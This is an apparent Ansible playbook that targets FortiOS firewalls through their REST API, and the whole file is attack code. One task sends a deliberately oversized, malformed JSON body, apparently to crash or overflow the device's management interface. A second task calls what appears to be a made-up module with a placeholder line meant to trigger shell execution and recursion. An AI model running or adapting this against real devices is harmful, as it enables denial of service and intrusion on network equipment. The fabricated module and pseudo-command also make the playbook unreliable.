
- hosts: all
  gather_facts: no

  tasks:
    - name: Send GET API request with long JSON payload
      uri:
        url: "{{ inventory_hostname }}/api/v2/cmdb/system/interface"
        method: GET
        headers:
          Authorization: "Bearer {{ api_token }}"
          Content-Type: "application/json"
        body: "{{ '{' + 'a' * 20000 + ':' + 'a' * 20000 + '}' }}"

    - name: Execute fortios_system_api_cli module recursively
      fortios_system_api_cli:
        host: "{{ inventory_hostname }}"
        username: "{{ api_username }}"
        password: "{{ api_password }}"
        adom: "root"
        commands:
          - execute a shell command, which will trigger recursion

